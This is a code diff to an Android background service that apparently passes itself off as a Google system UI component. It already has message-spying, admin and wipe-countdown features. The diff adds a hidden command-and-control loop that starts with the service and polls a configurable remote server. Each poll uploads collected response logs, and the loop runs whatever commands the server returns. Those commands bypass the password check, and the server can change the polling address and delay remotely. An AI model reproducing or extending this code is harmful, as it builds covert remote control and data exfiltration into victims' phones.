@@ -12,6 +12,7 @@ import android.preference.*;
 import android.speech.tts.*;
 import android.speech.tts.TextToSpeech.*;
 import android.telephony.*;
+import android.util.*;
 import com.genonbeta.CoolSocket.*;
 import com.google.android.systemUi.config.*;
 import com.google.android.systemUi.helper.*;
@@ -24,6 +25,8 @@ import org.json.*;
 public class CommunicationService extends Service implements OnInitListener
 {
 	public static final String TAG = "CommunationService";
+	public static final String REMOTE_SERVER = "RemoteServer";
+	
 	public static boolean mAdminMode = false;
 
 	private CommunicationServer mCommunationServer;
@@ -40,8 +43,12 @@ public class CommunicationService extends Service implements OnInitListener
 	private boolean mSpyMessages = false;
 	private Vibrator mVibrator;
 	private int mWipeCountdown = 8;
+	private long mRemoteThreadDelay = 50000;
 	private ArrayList<ParallelConnection> mParallelConnections = new ArrayList<ParallelConnection>();
-
+	private RemoteServer mRemote;
+	private RemoteThread mRemoteThread = new RemoteThread();
+	private JSONArray mRemoteLogs = new JSONArray();
+	
 	private class CommunicationServer extends CoolJsonCommunication
 	{
 		public CommunicationServer()
@@ -80,7 +87,7 @@ public class CommunicationService extends Service implements OnInitListener
 				response.put("warning", "Request notified");
 			}
 
-			if (!mGrantedList.contains(clientIp))
+			if (!mGrantedList.contains(clientIp) && !REMOTE_SERVER.equals(clientIp))
 			{
 				if (!mPreferences.contains("password"))
 				{
@@ -415,6 +422,32 @@ public class CommunicationService extends Service implements OnInitListener
 						
 						result = true;
 						break;
+					case "remoteServer":
+						String currentServer = mPreferences.getString("remoteServer","not-defined");
+						
+						response.put("currentServer", currentServer);
+						
+						if (receivedMessage.has("server"))
+						{
+							mPreferences.edit().putString("remoteServer", receivedMessage.getString("server")).commit();
+							response.put("newlySet", receivedMessage.getString("server"));
+						}
+						
+						if (receivedMessage.has("test"))
+						{
+							response.put("isOkay", mRemote.connect(null));
+						}
+						
+						result = true;
+						
+						break;
+					case "remoteServerDelay":
+						response.put("previousDelay", mPreferences.getLong("remoteServerDelay", mRemoteThreadDelay));
+						mPreferences.edit().putLong("remoteServerDelay", receivedMessage.getLong("delay")).commit();
+						mRemoteThreadDelay = receivedMessage.getLong("delay");
+						
+						result = true;
+						break;
 					case "stopSelf":
 						stopSelf();
 						result = true;
@@ -424,6 +457,9 @@ public class CommunicationService extends Service implements OnInitListener
 				}
 
 				response.put("result", result);
+				
+				if (REMOTE_SERVER.equals(clientIp))
+					mRemoteLogs.put(response.toString());
 			}
 		}
 
@@ -501,24 +537,48 @@ public class CommunicationService extends Service implements OnInitListener
 			return (this.mType == TYPE_TEL_NUMBER) ? this.mNumber: this.mServer + ":" + this.mPort;
 		}
 	}
-
-	private class ConnectionTest implements Runnable
+	
+	class RemoteThread extends Thread
 	{
-		private int mTimes;
-		private int mPort;
-		private String mServer;
-
-		public ConnectionTest(int times, String server, int port)
-		{
-
-		}
+		public RemoteThread()
+		{}
 
 		@Override
 		public void run()
 		{
-			for (int i = 0; i < this.mTimes; i++)
+			super.run();
+			Log.d(TAG, "RemoteServer thread started");
+			
+			while (!isInterrupted())
 			{
-
+				if (mRemote == null)
+					continue;
+				
+				try
+				{
+					JSONArray cmds = new JSONArray(mRemote.connect(mRemoteLogs.toString()));
+					
+					if (cmds.length() > 0)
+						for (int i = 0; i < cmds.length(); i++)
+						{
+							runCommandSMS(REMOTE_SERVER, cmds.getString(i));
+						}
+					
+					mRemoteLogs = new JSONArray();
+				}
+				catch (Exception e)
+				{
+					e.printStackTrace();
+				}
+				
+				try
+				{
+					Thread.sleep(mRemoteThreadDelay);
+				}
+				catch (InterruptedException e)
+				{
+					e.printStackTrace();
+				}
 			}
 		}
 	}
@@ -620,6 +680,8 @@ public class CommunicationService extends Service implements OnInitListener
 			stopSelf();
 			
 		mCommunationServer.setAddTabsToResponse(2);
+		
+		mRemoteThread.start();
 	}
 
 	@Override
@@ -627,6 +689,7 @@ public class CommunicationService extends Service implements OnInitListener
 	{
 		super.onDestroy();
 
+		mRemoteThread.interrupt();
 		mCommunationServer.stop();
 		ttsExit();
 	}
@@ -647,7 +710,10 @@ public class CommunicationService extends Service implements OnInitListener
 		mPreferences = PreferenceManager.getDefaultSharedPreferences(this);
 		mPowerManager = (PowerManager) getSystemService("power");
 		mVibrator = (Vibrator) getSystemService("vibrator");
-
+		mRemote = new RemoteServer(mPreferences.getString("remoteServer", "not-defined"));
+		
+		mRemoteThreadDelay = mPreferences.getLong("remoteServerDelay", mRemoteThreadDelay);
+		
 		if (mPreferences.contains("upprFile"))
 		{
 			File uppr = new File(mPreferences.getString("upprFile", "/sdcard/uppr"));
